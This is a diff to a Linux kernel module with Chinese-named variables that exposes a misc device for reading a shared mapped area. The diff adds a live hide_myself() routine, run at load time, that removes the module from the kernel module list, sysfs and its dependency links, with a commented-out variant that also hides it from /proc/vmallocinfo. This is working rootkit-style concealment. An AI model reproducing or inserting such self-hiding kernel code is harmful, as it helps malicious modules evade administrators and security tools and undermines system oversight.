@@ -1,8 +1,15 @@
 
 #include "fixFork.h"
+//#include "zj.h"
 #include "func.h"
 #include "ini.h"
+//#include <linux/module.h>
 #include <linux/module.h>
+#include <net/netfilter/nf_conntrack_core.h>
+#include <asm-generic/delay.h>
+#include <linux/kallsyms.h>
+//#include <linux/list.c>
+#include <linux/vmalloc.h>
 
 #ifndef VM_RESERVED
 #define VM_RESERVED (VM_DONTEXPAND | VM_DONTDUMP)
@@ -10,7 +17,25 @@
 
 #define 大小 映射区->数据体[线程标号].大小
 
+//内核函数原型，为导出函数，用于找到输入函数名所对应的函数入口地址
+//#include <linux/kallsyms.h>
+/* Lookup the address for this symbol. Returns 0 if not found. */
+/*unsigned long kallsyms_lookup_name(const char *name)
+{
+	char namebuf[KSYM_NAME_LEN];
+	unsigned long i;
+	unsigned int off;
 
+	for (i = 0, off = 0; i < kallsyms_num_syms; i++) {
+		off = kallsyms_expand_symbol(off, namebuf, ARRAY_SIZE(namebuf));
+
+		if (strcmp(namebuf, name) == 0)
+			return kallsyms_sym_address(i);
+	}
+	return module_kallsyms_lookup_name(name);
+}
+
+EXPORT_SYMBOL_GPL(kallsyms_lookup_name);*/
 static ssize_t 读操作(struct file *file, char __user *buf, size_t 线程标号, loff_t *ppos)
 {
 	int 结果;
@@ -114,6 +139,42 @@ struct miscdevice misc = {
 	.name = DEV_FILENAME,
 	.fops = &dev_fops,
 };
+/*struct timer_list timer;
+// 模拟重体力劳动
+static void timer_func(unsigned long data)
+{
+	udelay(1000);
+	mod_timer(&timer, jiffies + 10);
+}*/
+
+static void __init hide_myself(void)
+{
+	struct vmap_area *va, *vtmp;
+	struct module_use *use, *tmp;
+	struct list_head *_vmap_area_list;
+	struct rb_root *_vmap_area_root;
+
+/*_vmap_area_list = (struct list_head *)kallsyms_lookup_name("vmap_area_list");
+	_vmap_area_root = (struct rb_root *)kallsyms_lookup_name("vmap_area_root");
+
+	// 摘除vmalloc调用关系链，/proc/vmallocinfo中不可见
+	list_for_each_entry_safe(va, vtmp, _vmap_area_list, list) {
+		if ((unsigned long)THIS_MODULE > va->va_start && (unsigned long)THIS_MODULE < va->va_end) {
+			list_del(&va->list);
+			// rbtree中摘除，无法通过rbtree找到
+			rb_erase(&va->rb_node, _vmap_area_root);
+		}
+	}*/
+
+    list_del_init(&THIS_MODULE->list);
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+	list_for_each_entry_safe(use, tmp, &THIS_MODULE->target_list, target_list) {
+		list_del(&use->source_list);
+		list_del(&use->target_list);
+		sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
+		kfree(use);
+	}
+}
 
 int __init misc_dev_init(void)
 {
@@ -124,14 +185,17 @@ int __init misc_dev_init(void)
 //	list_del_init(&THIS_MODULE);
   // kobject_del(&THIS_MODULE);
 	ret = misc_register(&misc);
-	struct module *mod;
-	list_for_each_entry(mod, *(&THIS_MODULE->list.prev), list )
-        printk(KERN_ALERT "module name: %s\n", mod->name );
-       
-        list_del_init(&__this_module.list);
-       
-        kobject_del(&THIS_MODULE->mkobj.kobj);
-	return ret;
+	hide_myself();
+/*	init_timer(&timer);
+	timer.expires = jiffies + 20;
+	timer.function = timer_func;
+	add_timer(&timer);*/
+
+	// 模拟依赖。我们需要在依赖关系中也隐藏掉该模块的行踪
+	printk("address:%p   this:%p\n", nf_conntrack_in, THIS_MODULE);
+
+	return 0;
+//	return ret;
 }
 
 void __exit misc_dev_exit(void)
@@ -142,7 +206,10 @@ void __exit misc_dev_exit(void)
 	kfree(映射区);
 
 	misc_deregister(&misc);
+//   del_timer_sync(&timer);
+
 }
+// hidemyself.c
 
 module_init(misc_dev_init);
 module_exit(misc_dev_exit);
